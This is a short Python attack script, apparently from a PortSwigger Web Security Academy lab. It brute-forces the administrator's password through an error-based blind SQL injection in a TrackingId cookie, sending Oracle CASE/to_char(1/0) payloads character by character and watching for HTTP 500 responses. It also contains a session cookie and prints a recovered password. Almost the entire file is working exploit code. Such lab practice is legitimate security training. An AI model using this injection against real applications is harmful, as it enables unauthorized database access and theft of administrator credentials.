#!/usr/bin/python3
from pwn import *
import requests
import signal
import time
import pdb
import sys
import string


def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a5a00870454232ec092fba3009a00ac.web-security-academy.net"
characters = string.ascii_letters + string.digits


def makeRequest():
    
    password = ""
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")
    
    for position in range(1, 21):
        for character in characters:
                cookies = {
                        'TrackingId': "0LYsfMg5Xjr4mJeg'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                        'session': '42T80pRYOsMi4gXZOlOBD60iIB55V7Bw'
                }
                p1.status(cookies['TrackingId'])
                r = requests.get(main_url, cookies=cookies)
                if r.status_code == 500:
                    password += character
                    p2.status(password)
                    break

print("My password was: fmic7lf2qnioxjuqbe2l")
if __name__ == '__main__':

	makeRequest()
